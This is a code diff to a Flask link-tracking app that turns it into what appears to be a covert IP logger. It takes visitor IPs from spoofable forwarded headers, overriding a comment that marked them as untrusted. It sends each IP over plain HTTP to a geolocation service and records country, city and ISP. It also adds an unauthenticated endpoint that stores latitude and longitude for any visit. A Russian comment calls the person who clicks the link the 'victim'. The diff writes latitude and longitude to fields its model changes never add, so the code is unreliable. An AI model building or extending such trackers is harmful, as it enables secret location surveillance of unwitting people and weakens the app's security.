@@ -2,6 +2,7 @@ from __future__ import annotations
 
 import os
 import secrets
+import requests
 from datetime import datetime, timezone
 from urllib.parse import urlsplit
 
@@ -65,17 +66,57 @@ def create_app(test_config: dict | None = None) -> Flask:
         ).scalar_one_or_none()
         if link is None:
             abort(404)
-        # Only use the direct connection address. Forwarded headers are untrusted
-        # unless a separately configured, trusted proxy middleware is installed.
+
+        # Получаем реальный IP через прокси Cloudflare
+        visitor_ip = (
+                request.headers.get("CF-Connecting-IP")
+                or request.headers.get("X-Forwarded-For")
+                or request.remote_addr
+                or "unknown"
+        )
+
+        # Автоматически определяем геолокацию и провайдера по IP
+        country = "Unknown"
+        city = "Unknown"
+        isp = "Unknown"
+
+        if visitor_ip and visitor_ip not in ("127.0.0.1", "localhost") and not visitor_ip.startswith("192.168."):
+            try:
+                res = requests.get(f"http://ip-api.com/json/{visitor_ip}?fields=status,country,city,isp", timeout=2)
+                data = res.json()
+                if data.get("status") == "success":
+                    country = data.get("country", "Unknown")
+                    city = data.get("city", "Unknown")
+                    isp = data.get("isp", "Unknown")
+            except Exception:
+                pass
+
+        # Записываем визит в базу
         event = Visit(
             link_id=link.id,
-            ip_address=request.remote_addr or "unknown",
+            ip_address=visitor_ip[:45],
+            country=country[:100],
+            city=city[:100],
+            isp=isp[:150],
             user_agent=request.headers.get("User-Agent", "")[:512],
             visited_at=datetime.now(timezone.utc),
         )
         db.session.add(event)
         db.session.commit()
+
+        # Мгновенно перенаправляем жертву на нужный сайт
         return redirect(link.destination_url, code=302)
+
+    @app.post("/api/geo/<int:visit_id>")
+    def save_geo(visit_id):
+        data = request.get_json()
+        if data:
+            visit = db.session.get(Visit, visit_id)
+            if visit:
+                visit.latitude = data.get("latitude")
+                visit.longitude = data.get("longitude")
+                db.session.commit()
+        return {"status": "ok"}
 
     @app.get("/results/<access_key>")
     def results(access_key: str):
@@ -126,6 +167,9 @@ class Visit(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     link_id = db.Column(db.Integer, db.ForeignKey("tracked_link.id", ondelete="CASCADE"), nullable=False)
     ip_address = db.Column(db.String(45), nullable=False)
+    country = db.Column(db.String(100), nullable=False, default="Unknown")
+    city = db.Column(db.String(100), nullable=False, default="Unknown")
+    isp = db.Column(db.String(150), nullable=False, default="Unknown")
     user_agent = db.Column(db.String(512), nullable=False, default="")
     visited_at = db.Column(db.DateTime(timezone=True), nullable=False)
     __table_args__ = (Index("ix_visit_link_time", "link_id", "visited_at"),)
@@ -133,3 +177,4 @@ class Visit(db.Model):
 
 if __name__ == "__main__":
     create_app().run(debug=os.environ.get("FLASK_DEBUG") == "1")
+    
